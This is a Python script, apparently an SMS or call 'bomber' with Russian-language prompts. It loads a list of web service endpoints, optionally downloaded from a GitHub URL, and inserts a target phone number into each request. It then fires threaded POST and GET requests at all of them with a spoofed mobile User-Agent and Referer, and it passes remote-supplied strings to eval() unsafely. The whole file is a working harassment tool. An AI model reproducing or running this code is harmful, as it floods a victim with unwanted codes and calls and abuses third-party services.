import requests, sys, os, json, threading
def loadservices(filename):
	try:
		o = open(filename, "r", encoding='utf-8')
		data = json.load(o)
		return data
	except Exception as E:
		o = open(filename, "w", encoding='utf-8')
		print("Файл с сервисами повреждён.")
		backup = input("Загрузить пример service-файла? (0/1): ")
		if str(backup) != "0":
			if str(backup) != "1":
				print("Было принято решение не загружать файл services.")
				exit()
			elif str(backup) == "1":
				print("Загружаем файл services")
				r = requests.get("https://raw.githubusercontent.com/zalsy/services/master/services.txt")
				o.write(r.text)
				print("Загружено!")
		else:
			print("Было принято решение не загружать файл services.")
			exit()
		o.close()
		o = open(filename, "r", encoding='utf-8')
		data = json.load(o)
		return data
def sendrequest(service, method, data, headers, params, json):
	if method == "POST":
		if headers == "":
			headers = {'Referer': str(service), 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Mobile Safari/537.36'}
		r = requests.post(str(service), headers=headers, data=data, params=params, json=json)
		print ("service: " + str(service) + "; response: " + str(r))
	elif method == "GET":
		if headers == "":
			headers = {'Referer': str(service), 'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Mobile Safari/537.36'}
		r = requests.get(str(service), headers=headers, data=data, params=params, json=json)
		print ("service: " + str(service) + "; response: " + str(r))
def run(services, phonenumber):		
	for line in services:
		if "$phone" in str(line["headers"]):
			if line["+"] == 1:
				line["headers"] = str(line["headers"]).replace("$phone", "+"+str(phonenumber))
				line["headers"] = eval(str(line["headers"]))
			else:
				line["data"] = str(line["data"]).replace("$phone", str(phonenumber))
				line["data"] = eval(str(line["data"]))
		if "$phone" in str(line["data"]):
			if line["+"] == 1:
				line["data"] = str(line["data"]).replace("$phone", "+"+str(phonenumber))
				line["data"] = eval(str(line["data"]))
			else:
				line["data"] = str(line["data"]).replace("$phone", str(phonenumber))
				line["data"] = eval(str(line["data"]))
		if "$phone" in str(line["params"]):
			if line["+"] == 1:
				line["params"] = str(line["params"]).replace("$phone", "+"+str(phonenumber))
				line["params"] = eval(str(line["params"]))
			else:
				line["params"] = str(line["params"]).replace("$phone", str(phonenumber))
				line["params"] = eval(str(line["params"]))
		if "$phone" in str(line["json"]):
			if line["+"] == 1:
				line["json"] = str(line["json"]).replace("$phone", "+"+str(phonenumber))
				line["json"] = eval(str(line["json"]))
			else:
				line["json"] = str(line["json"]).replace("$phone", str(phonenumber))
				line["json"] = eval(str(line["json"]))
		if "$phone" in str(line["service"]):
			if line["+"] == 1:
				line["service"] = str(line["service"]).replace("$phone", "+"+str(phonenumber))
			else:
				line["service"] = str(line["service"]).replace("$phone", str(phonenumber))
		x = threading.Thread(target=sendrequest, args=(str(line["service"]), str(line["method"]), line["data"], line["headers"], line["params"], line["json"]))
		x.start()